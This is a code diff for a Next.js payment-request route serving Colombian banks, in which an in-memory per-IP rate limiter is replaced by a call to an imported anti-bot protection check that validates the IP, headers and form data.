@@ -1,4 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
+import { antiBotProtection } from '@/lib/anti-bot';
 
 // Lista de bancos permitidos
 const ALLOWED_BANKS = [
@@ -60,10 +61,6 @@ const URL_BANCOLOMBIA = "";
 const REDIRECCION_BOGOTA = true;
 const URL_BOGOTA = "";
 
-// Rate limiting simple en memoria (en producción usar Redis)
-const rateLimitMap = new Map<string, number>();
-const TIME_LIMIT_SECONDS = 30;
-
 export async function POST(request: NextRequest) {
   try {
     // Obtener IP del cliente
@@ -71,20 +68,23 @@ export async function POST(request: NextRequest) {
                request.headers.get('x-real-ip') ||
                'unknown';
 
-    // Rate limiting
-    const lastAccess = rateLimitMap.get(ip);
-    const now = Date.now();
-
-    if (lastAccess && (now - lastAccess) < TIME_LIMIT_SECONDS * 1000) {
-      return NextResponse.json(
-        { Error: "Demasiadas solicitudes. Intenta de nuevo en 30 segundos." },
-        { status: 429 }
-      );
-    }
-    rateLimitMap.set(ip, now);
-
     // Parsear body (form-urlencoded)
     const formData = await request.formData();
+
+    // Convertir FormData a objeto para validación
+    const formDataObj: Record<string, unknown> = {};
+    formData.forEach((value, key) => {
+      formDataObj[key] = value;
+    });
+
+    // Protección Anti-Bot completa
+    const protection = antiBotProtection(ip, request.headers, formDataObj);
+    if (!protection.allowed) {
+      return NextResponse.json(
+        { Error: protection.error },
+        { status: protection.statusCode || 400 }
+      );
+    }
     const body = {
       amount: formData.get('amount'),
       bankCode: formData.get('bankCode'),
